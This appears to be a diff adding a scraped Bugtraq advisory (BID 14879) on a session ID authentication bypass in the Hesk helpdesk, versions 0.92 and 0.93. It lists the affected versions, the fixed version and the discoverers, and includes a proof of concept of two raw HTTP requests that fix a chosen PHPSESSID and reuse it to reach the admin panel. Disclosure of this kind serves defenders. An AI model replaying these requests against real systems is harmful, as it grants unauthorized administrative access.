@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid14879<p><b><span style="font-size: 18pt;">Hesk Session ID Authentication Bypass Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14879/info">info</a><br><a href="http://www.securityfocus.com/bid/14879/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14879/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14879/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14879/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14879
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 20 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 20 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Rajesh Sethumadhavan, Rahul Mohandas, and Jayesh K.S of OS2A are credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Hesk Hesk 0.93 <br/>
+					
+				
+					Hesk Hesk 0.92 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Hesk Hesk 0.93.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept is available:<br/>1. HTTP POST request with randomly chosen Session ID:<br/>POST admin.php +<br/>("Host: www.example.com<br/>  User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7)<br/>  Accept: text/xml,application/xml,application/xhtml+xml,text/html<br/>  Accept-Language: en-us,en;q=0.5<br/>  Accept-Encoding: gzip,deflate<br/>  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>  Keep-Alive: 300<br/>  Connection: keep-alive<br/>  Referer: http://www.example.com/hesk/admin.php<br/>  Cookie: PHPSESSID=12345                             &lt;!-- Random Session ID--!&gt;<br/>  Content-Type: application/x-www-form-urlencoded<br/>  Content-Length: 26<br/>  user=1&amp;pass=sdfd&amp;a=do_login");<br/><br/>2. GET request to administrative control panel:<br/>GET admin_main.php +<br/>("Host: www.example.com<br/>  User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7)<br/>  Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain<br/>  Accept-Language: en-us,en;q=0.5<br/>  Accept-Encoding: gzip,deflate<br/>  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>  Keep-Alive: 300<br/>  Connection: keep-alive<br/>  Cookie: PHPSESSID=12345")                            &lt;!-- Session ID --!&gt;
+	
+		<ul>
+</ul>
+</div>
